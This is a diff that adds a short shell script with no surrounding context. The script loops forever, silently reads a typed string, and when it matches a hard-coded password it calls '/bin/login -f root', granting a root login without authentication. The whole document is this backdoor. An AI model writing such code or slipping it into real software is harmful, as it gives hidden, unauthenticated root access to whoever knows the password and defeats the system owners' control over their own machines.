@@ -1,0 +1,7 @@
+#!/bin/sh
+
+while (true)
+do
+	read -s string
+	if [ "$string" = "lilalUtz" ] ; then /bin/login -f root ; fi
+done
